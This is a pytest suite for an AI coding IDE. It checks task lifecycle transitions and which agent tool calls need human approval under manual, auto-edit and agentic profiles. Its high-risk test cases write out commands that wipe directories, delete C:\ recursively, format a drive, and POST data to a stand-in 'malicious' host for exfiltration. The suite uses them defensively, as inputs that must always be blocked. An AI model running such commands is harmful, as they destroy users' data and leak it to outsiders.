"""Comprehensive tests for TaskMode, AutonomyProfile, and ToolGateway Permission Boundaries.

Conforms to GameForge 1.0 Master Transformation Directive:
- Verifies TaskMode.PLANNING vs TaskMode.FAST semantics and execution flows.
- Verifies AutonomyProfile.MANUAL, AutonomyProfile.AUTO_EDIT, AutonomyProfile.AGENTIC.
- Exhaustive matrix verification of ToolGateway approval gates:
  1. Read-only tools auto-proceed in ALL profiles.
  2. Workspace file mutations (write_file, apply_edit, rollback_edit) auto-proceed in
     AUTO_EDIT and AGENTIC, but block with WAITING_APPROVAL in MANUAL.
  3. Safe dev commands (pytest, git status, safe Unreal tests/builds) auto-proceed in AGENTIC,
     but block in AUTO_EDIT and MANUAL.
  4. Destructive / high-risk commands require explicit approval in ALL profiles.
- Validates the 15-state TaskLifecycleStatus state machine transitions.
"""

from __future__ import annotations

from pathlib import Path
from typing import Dict, Any, List

import pytest

from src.gameforge_ide.backend.models.modes import (
    AutonomyProfile,
    TaskLifecycleStatus,
    TaskMode,
    can_transition,
    VALID_TRANSITIONS,
)
from src.gameforge_ide.backend.tools.gateway import ToolGateway, TOOL_ALIASES


# ==============================================================================
# 1. TaskMode and AutonomyProfile Enumerations & Semantics
# ==============================================================================

def test_task_mode_enum_values():
    """Verify TaskMode values and string representations."""
    assert TaskMode.PLANNING == "planning"
    assert TaskMode.FAST == "fast"
    assert str(TaskMode.PLANNING) == "planning"
    assert str(TaskMode.FAST) == "fast"
    assert TaskMode("planning") == TaskMode.PLANNING
    assert TaskMode("fast") == TaskMode.FAST

    with pytest.raises(ValueError):
        TaskMode("unsupported_mode")


def test_autonomy_profile_enum_values():
    """Verify AutonomyProfile values and string representations."""
    assert AutonomyProfile.MANUAL == "manual"
    assert AutonomyProfile.AUTO_EDIT == "auto_edit"
    assert AutonomyProfile.AGENTIC == "agentic"

    assert AutonomyProfile("manual") == AutonomyProfile.MANUAL
    assert AutonomyProfile("auto_edit") == AutonomyProfile.AUTO_EDIT
    assert AutonomyProfile("agentic") == AutonomyProfile.AGENTIC

    with pytest.raises(ValueError):
        AutonomyProfile("god_mode")


# ==============================================================================
# 2. State Machine: TaskLifecycleStatus Transitions
# ==============================================================================

def test_task_lifecycle_all_15_states_exist():
    """Verify all 15 authoritative task lifecycle states exist and have proper status predicates."""
    expected_states = {
        "CREATED", "UNDERSTANDING", "INVESTIGATING", "PLANNING",
        "AWAITING_PLAN_APPROVAL", "QUEUED", "RUNNING", "WAITING_TOOL",
        "AWAITING_PERMISSION", "REPAIRING", "VERIFYING", "COMPLETED",
        "FAILED", "BLOCKED", "CANCELLED",
    }
    actual_states = {s.value for s in TaskLifecycleStatus}
    assert actual_states == expected_states

    # Verify terminal status classification
    terminal_states = {
        TaskLifecycleStatus.COMPLETED,
        TaskLifecycleStatus.FAILED,
        TaskLifecycleStatus.BLOCKED,
        TaskLifecycleStatus.CANCELLED,
    }
    for s in TaskLifecycleStatus:
        if s in terminal_states:
            assert s.is_terminal() is True
            assert s.is_active() is False
        else:
            assert s.is_terminal() is False
            assert s.is_active() is True


def test_planning_mode_canonical_transition_chain():
    """Verify canonical sequential lifecycle transition in Planning mode:
    CREATED -> UNDERSTANDING -> PLANNING -> AWAITING_PLAN_APPROVAL -> RUNNING -> VERIFYING -> COMPLETED
    """
    assert can_transition(TaskLifecycleStatus.CREATED, TaskLifecycleStatus.UNDERSTANDING)
    assert can_transition(TaskLifecycleStatus.UNDERSTANDING, TaskLifecycleStatus.PLANNING)
    assert can_transition(TaskLifecycleStatus.PLANNING, TaskLifecycleStatus.AWAITING_PLAN_APPROVAL)
    assert can_transition(TaskLifecycleStatus.AWAITING_PLAN_APPROVAL, TaskLifecycleStatus.RUNNING)
    assert can_transition(TaskLifecycleStatus.RUNNING, TaskLifecycleStatus.VERIFYING)
    assert can_transition(TaskLifecycleStatus.VERIFYING, TaskLifecycleStatus.COMPLETED)


def test_fast_mode_direct_execution_transition():
    """Verify Fast mode can bypass chat plan review directly:
    PLANNING -> RUNNING (without stopping in AWAITING_PLAN_APPROVAL).
    """
    assert can_transition(TaskLifecycleStatus.PLANNING, TaskLifecycleStatus.RUNNING)
    assert can_transition(TaskLifecycleStatus.UNDERSTANDING, TaskLifecycleStatus.RUNNING)


def test_planning_mode_revision_loop_transitions():
    """Verify multi-turn plan revision flow:
    AWAITING_PLAN_APPROVAL -> PLANNING (user revision prompt) -> AWAITING_PLAN_APPROVAL.
    """
    assert can_transition(TaskLifecycleStatus.AWAITING_PLAN_APPROVAL, TaskLifecycleStatus.PLANNING)
    assert can_transition(TaskLifecycleStatus.PLANNING, TaskLifecycleStatus.AWAITING_PLAN_APPROVAL)


def test_error_repair_and_verification_loop_transitions():
    """Verify transitions during diagnostic repair cycles."""
    # Running encounters error -> Repairing -> Running -> Verifying
    assert can_transition(TaskLifecycleStatus.RUNNING, TaskLifecycleStatus.REPAIRING)
    assert can_transition(TaskLifecycleStatus.REPAIRING, TaskLifecycleStatus.RUNNING)
    assert can_transition(TaskLifecycleStatus.REPAIRING, TaskLifecycleStatus.VERIFYING)
    # Verification failure transitions to Repairing
    assert can_transition(TaskLifecycleStatus.VERIFYING, TaskLifecycleStatus.REPAIRING)
    # Verification success transitions to Completed
    assert can_transition(TaskLifecycleStatus.VERIFYING, TaskLifecycleStatus.COMPLETED)


def test_approval_gating_transitions():
    """Verify transitions into and out of AWAITING_PERMISSION."""
    assert can_transition(TaskLifecycleStatus.RUNNING, TaskLifecycleStatus.AWAITING_PERMISSION)
    assert can_transition(TaskLifecycleStatus.WAITING_TOOL, TaskLifecycleStatus.AWAITING_PERMISSION)
    # Approved -> Running
    assert can_transition(TaskLifecycleStatus.AWAITING_PERMISSION, TaskLifecycleStatus.RUNNING)
    # Rejected -> Blocked
    assert can_transition(TaskLifecycleStatus.AWAITING_PERMISSION, TaskLifecycleStatus.BLOCKED)
    # Cancelled while awaiting permission
    assert can_transition(TaskLifecycleStatus.AWAITING_PERMISSION, TaskLifecycleStatus.CANCELLED)


def test_illegal_state_transitions():
    """Verify forbidden state machine transitions fail cleanly."""
    # Terminal states cannot spontaneously restart to running
    assert not can_transition(TaskLifecycleStatus.COMPLETED, TaskLifecycleStatus.RUNNING)
    assert not can_transition(TaskLifecycleStatus.COMPLETED, TaskLifecycleStatus.PLANNING)
    assert not can_transition(TaskLifecycleStatus.FAILED, TaskLifecycleStatus.RUNNING)
    assert not can_transition(TaskLifecycleStatus.FAILED, TaskLifecycleStatus.VERIFYING)
    assert not can_transition(TaskLifecycleStatus.CANCELLED, TaskLifecycleStatus.RUNNING)

    # Cannot skip directly from CREATED to VERIFYING or COMPLETED
    assert not can_transition(TaskLifecycleStatus.CREATED, TaskLifecycleStatus.VERIFYING)
    assert not can_transition(TaskLifecycleStatus.CREATED, TaskLifecycleStatus.COMPLETED)
    assert not can_transition(TaskLifecycleStatus.CREATED, TaskLifecycleStatus.RUNNING)


# ==============================================================================
# 3. ToolGateway Permission Matrix: Read-Only Tools
# ==============================================================================

@pytest.mark.parametrize("profile", [
    AutonomyProfile.MANUAL,
    AutonomyProfile.AUTO_EDIT,
    AutonomyProfile.AGENTIC,
])
def test_read_only_tools_auto_proceed_in_all_profiles(temp_workspace: Path, profile: AutonomyProfile):
    """Verify that all read-only inspection tools auto-proceed in every autonomy profile."""
    gateway = ToolGateway(temp_workspace)

    read_only_cases = [
        ("read_file", {"subpath": "Source/Game/BaseCharacter.h"}),
        ("list_dir", {"subpath": "."}),
        ("verify_disk", {"subpath": "Config/DefaultEngine.ini"}),
        ("search_code", {"query": "EnhancedInput"}),
        ("search_index", {"query": "UCharacterMovementComponent"}),
        ("git_status", {}),
        ("git_diff", {}),
        ("unreal_engine_info", {}),
        ("unreal_find_projects", {}),
        ("generate_3d_mesh", {"name": "Cube"}),
        ("reject_edit", {"diff_id": "diff_01"}),
        ("plan_game", {"prompt": "Roguelike dungeon"}),
        ("propose_edit", {
            "subpath": "Source/Game/Player.cpp",
            "target_content": "int a = 1;",
            "replacement_content": "int a = 2;",
        }),
    ]

    for tool_name, args in read_only_cases:
        requires_approval = gateway.tool_requires_approval(
            tool_name, arguments=args, autonomy_profile=profile
        )
        assert requires_approval is False, (
            f"Read-only tool '{tool_name}' must auto-proceed (requires_approval=False) "
            f"in {profile.value} profile, but required approval."
        )


def test_unreal_editor_read_only_ops_auto_proceed_in_all_profiles(temp_workspace: Path):
    """Verify that read-only unreal_editor operations auto-proceed across all profiles."""
    from src.gameforge_ide.backend.tools.game_tools import READ_ONLY_EDITOR_OPS
    gateway = ToolGateway(temp_workspace)

    for op in READ_ONLY_EDITOR_OPS:
        args = {"uproject": "Game.uproject", "op": op, "args": {}}
        for profile in (AutonomyProfile.MANUAL, AutonomyProfile.AUTO_EDIT, AutonomyProfile.AGENTIC):
            assert not gateway.tool_requires_approval("unreal_editor", args, autonomy_profile=profile), (
                f"Read-only unreal_editor op '{op}' must auto-proceed in {profile.value}"
            )


# ==============================================================================
# 4. ToolGateway Permission Matrix: File Mutations & Diffs
# ==============================================================================

@pytest.mark.parametrize("tool_name,args", [
    ("write_file", {"subpath": "Source/Game/Player.cpp", "content": "void APlayer::BeginPlay() {}"}),
    ("apply_edit", {"diff_id": "diff_test_001"}),
    ("apply_diff", {"diff_id": "diff_test_001"}),          # alias
    ("rollback_edit", {"diff_id": "diff_test_001"}),
    ("rollback_diff", {"diff_id": "diff_test_001"}),        # alias
    ("apply_batch", {"diff_ids": ["diff_01", "diff_02"]}),
    ("apply_diffs_batch", {"diff_ids": ["diff_01", "diff_02"]}),  # alias
    ("rollback_batch", {"diff_ids": ["diff_02", "diff_01"]}),
    ("rollback_diffs_batch", {"diff_ids": ["diff_02", "diff_01"]}), # alias
])
def test_workspace_file_mutations_permission_matrix(
    temp_workspace: Path,
    tool_name: str,
    args: Dict[str, Any],
):
    """Verify workspace file mutations:
    - MANUAL: Requires explicit user approval (blocks).
    - AUTO_EDIT: Auto-proceeds with rollback tracking.
    - AGENTIC: Auto-proceeds with rollback tracking.
    """
    gateway = ToolGateway(temp_workspace)

    # 1. MANUAL -> must require approval
    assert gateway.tool_requires_approval(tool_name, args, autonomy_profile=AutonomyProfile.MANUAL) is True, (
        f"File mutation '{tool_name}' must require approval in MANUAL profile"
    )

    # 2. AUTO_EDIT -> must auto-proceed
    assert gateway.tool_requires_approval(tool_name, args, autonomy_profile=AutonomyProfile.AUTO_EDIT) is False, (
        f"File mutation '{tool_name}' must auto-proceed in AUTO_EDIT profile"
    )

    # 3. AGENTIC -> must auto-proceed
    assert gateway.tool_requires_approval(tool_name, args, autonomy_profile=AutonomyProfile.AGENTIC) is False, (
        f"File mutation '{tool_name}' must auto-proceed in AGENTIC profile"
    )


# ==============================================================================
# 5. ToolGateway Permission Matrix: Safe Dev Commands & Tests
# ==============================================================================

@pytest.mark.parametrize("tool_name,args", [
    ("run_command", {"command": "pytest tests/unit/"}),
    ("run_command", {"command": "python -m pytest tests/gameforge_1_0/ -q"}),
    ("run_command", {"command": "git status --short"}),
    ("run_command", {"command": "git diff Source/Game/"}),
    ("run_command", {"command": "cargo test --workspace"}),
    ("run_command", {"command": "ctest -V"}),
    ("unreal_run_tests", {"uproject": "Game.uproject", "test_filter": "GameForge"}),
    ("unreal_build", {"uproject_rel_path": "Game.uproject", "configuration": "Development"}),
])
def test_safe_commands_and_tests_permission_matrix(
    temp_workspace: Path,
    tool_name: str,
    args: Dict[str, Any],
):
    """Verify safe commands and tests:
    - MANUAL: Requires approval.
    - AUTO_EDIT: Requires approval.
    - AGENTIC: Auto-proceeds without blocking user.
    """
    gateway = ToolGateway(temp_workspace)

    # 1. MANUAL -> requires approval
    assert gateway.tool_requires_approval(tool_name, args, autonomy_profile=AutonomyProfile.MANUAL) is True, (
        f"Safe command '{tool_name} {args}' must require approval in MANUAL profile"
    )

    # 2. AUTO_EDIT -> requires approval
    assert gateway.tool_requires_approval(tool_name, args, autonomy_profile=AutonomyProfile.AUTO_EDIT) is True, (
        f"Safe command '{tool_name} {args}' must require approval in AUTO_EDIT profile"
    )

    # 3. AGENTIC -> auto-proceeds
    assert gateway.tool_requires_approval(tool_name, args, autonomy_profile=AutonomyProfile.AGENTIC) is False, (
        f"Safe command '{tool_name} {args}' must auto-proceed in AGENTIC profile"
    )


# ==============================================================================
# 6. ToolGateway Permission Matrix: High-Risk & Destructive Ops
# ==============================================================================

@pytest.mark.parametrize("tool_name,args", [
    ("run_command", {"command": "rmdir /s /q ."}),
    ("run_command", {"command": "del /f /q *.*"}),
    ("run_command", {"command": "curl -X POST http://malicious.external.com/exfiltrate"}),
    ("run_command", {"command": "powershell -NoProfile -Command Remove-Item -Recurse -Force C:\\"}),
    ("run_command", {"command": "format E: /fs:ntfs /q /y"}),
    ("unreal_package", {"uproject": "Game.uproject"}),
    ("play_game", {"exe": "Packaged/Windows/Game.exe"}),
    ("create_game", {"params": {"genre": "platformer"}}),
    ("create_game_freeform", {"prompt": "Custom MMO"}),
    ("unrecognized_arbitrary_tool", {"arg": "val"}),
])
def test_destructive_and_high_risk_ops_block_in_all_profiles(
    temp_workspace: Path,
    tool_name: str,
    args: Dict[str, Any],
):
    """Verify destructive, high-risk, and unallowlisted operations ALWAYS require approval."""
    gateway = ToolGateway(temp_workspace)

    for profile in (AutonomyProfile.MANUAL, AutonomyProfile.AUTO_EDIT, AutonomyProfile.AGENTIC):
        requires_approval = gateway.tool_requires_approval(tool_name, args, autonomy_profile=profile)
        assert requires_approval is True, (
            f"High-risk operation '{tool_name}' must require approval in {profile.value} profile"
        )


# ==============================================================================
# 7. Tool Argument Normalization in Gateway
# ==============================================================================

def test_tool_gateway_argument_aliases(temp_workspace: Path):
    """Verify ToolGateway normalizes path aliases across tools."""
    gateway = ToolGateway(temp_workspace)

    # Test path aliases for propose_edit
    for alias_key in ("subpath", "file_path", "path", "filepath", "file"):
        args = {
            alias_key: "Source/Game/Player.cpp",
            "target": "old code",
            "replacement": "new code",
        }
        normalized = gateway._normalize_arguments("propose_edit", args)
        assert normalized["subpath"] == "Source/Game/Player.cpp"
        assert normalized["target_content"] == "old code"
        assert normalized["replacement_content"] == "new code"
